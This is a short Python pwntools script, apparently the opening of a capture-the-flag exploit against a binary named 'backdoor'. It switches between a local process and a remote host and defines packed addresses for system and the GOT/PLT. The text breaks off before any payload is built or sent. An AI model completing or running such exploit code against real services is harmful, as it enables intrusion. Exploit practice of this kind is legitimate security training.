from pwn import *

local = 1
if local:
    p = process('./backdoor')
else:
    p = remote('p007.cc', 7777)

base = p32(0x8048000)
sys = p32(0x080484f0)
got_plt = p32(0x804B000)

x = p32(0x0804B048)
